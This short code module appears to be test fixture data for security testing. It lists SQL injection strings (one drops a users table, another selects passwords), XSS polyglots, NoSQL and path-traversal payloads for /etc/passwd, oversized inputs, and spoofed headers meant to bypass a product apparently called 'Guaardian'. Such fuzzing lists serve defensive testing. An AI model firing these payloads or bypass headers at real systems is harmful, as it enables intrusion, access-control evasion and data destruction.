export const PAYLOADS = {
    SQL_INJECTION: [
        "' OR '1'='1",
        "1; DROP TABLE users",
        "1' UNION SELECT username, password FROM users--",
        "admin' --",
        "/**/UNION/**/SELECT/**/1,2,3--",
    ],
    XSS_POLYGLOTS: [
        "javascript://%250Aalert(1)//",
        "<scr<script>ipt>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "{{7*7}}", // SSTI
    ],
    NO_SQL_INJECTION: [
        "{\"$gt\": \"\"}",
        "{\"$ne\": null}",
    ],
    PATH_TRAVERSAL: [
        "../../../../etc/passwd",
        "..%2F..%2F..%2Fwindows%2Fwin.ini",
    ],
    LARGE_PAYLOADS: [
        "A".repeat(10000), // Buffer overflow attempt
        JSON.stringify({ a: { b: { c: { d: "A".repeat(500) } } } }), // Deep nesting
    ]
};

export const GUAARDIAN_BYPASS_HEADERS = {
    'X-Forwarded-For': '127.0.0.1',
    'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)',
    'X-Original-URL': '/admin',
};
